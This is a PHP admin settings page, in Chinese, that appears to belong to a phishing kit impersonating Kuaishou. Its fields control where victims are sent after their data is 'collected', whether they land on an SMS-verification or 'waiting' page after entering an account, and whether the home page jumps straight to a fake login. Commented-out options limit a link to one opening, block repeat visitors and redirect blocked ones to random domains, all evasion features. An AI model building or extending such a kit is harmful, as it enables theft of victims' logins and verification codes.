<?php
$title='后台设置';
$isbutton=true;
include './inc_header.php'; 
?><div class="table_msg"></div>
<form id="autosave" name="autosave" method="post" enctype="multipart/form-data" style="margin:0;" >
	<table class="right_table" border="0" cellpadding="5" cellspacing="0">
		<tr>
			<td class="table_left">结束跳转</td>
			<td ><input class="table_text" name="conf[readyJump]" placeholder="格式如：http://kuaishou.com/" value="<?php echo($conf['readyJump']); ?>">
				<span class="table_info" >采集结束后，网页的跳转方向</span>
				</td>
		</tr>
		<tr>
			<td class="table_left">统计代码</td>
			<td ><textarea class="table_text" id="tongji" name="conf[tongji]" placeholder='格式如：<script src="//js.users.51.la/19192484.js"></script>'><?php echo(stripslashes($conf['tongji'])); ?></textarea>
				<span class="table_info" >填写html统计代码</span></td>
		</tr>
		<tr class="qqShare">
			<td class="table_left">默认地址</td>
			<td >
				<select class="table_text" id="lasttype" name="conf[lasttype]">
					<option <?php if($conf['lasttype']==1)echo 'selected'; ?> value="1">跳短信验证</option>
					<option <?php if($conf['lasttype']==3)echo 'selected'; ?> value="3">跳等待中</option>
				</select>
				<span class="table_info" >填写账号后的默认地址</span>
			</td>
		</tr>
		<tr class="others">
			<td class="table_left">直接跳转</td>
			<td ><input type="hidden" name="conf[datatype]" value="0">
				<input class="table_checkbox" type="checkbox" id="datatype" name="conf[datatype]" <?php if($conf['datatype'])echo 'checked'; ?> value="1" >
				首页直接跳登录页</td>
		</tr>
		<!--
		<tr>
			<td class="table_left">屏蔽跳出</td>
			<td ><input class="table_text" name="conf[location]" placeholder="格式如：http://kuaishou.com/" value="<?php echo($conf['location']); ?>" />
				<span class="table_info" >禁止访问后的跳转方向，不填将产生随机域名</span></td>
		</tr>
		<tr>
			<td class="table_left">打开次数</td>
			<td ><input class="table_text" id="viewTimes" placeholder="根据需要填写" name="conf[viewTimes]" value="<?php echo($conf['viewTimes']); ?>" >
				<span class="table_info" >参数为 1 为仅允许打开一次，第二次将无法访问，0 为不启用</span></td>
		</tr>
		<tr class="others">
			<td class="table_left">屏蔽重复</td>
			<td ><input type="hidden" name="conf[denyReady]" value="0">
				<input class="table_checkbox" type="checkbox" id="denyReady" name="conf[denyReady]" <?php if($conf['denyReady'])echo 'checked'; ?> value="1" >
				输入顾过的用户不让打开</td>
		</tr>
		-->
	</table>
	<div class="button_save" >
		<input class="butt" id="do_save" name="save" type="button" value="保存设置">
	</div>
</form>
<?php 
	include './inc_footer.php';  
?>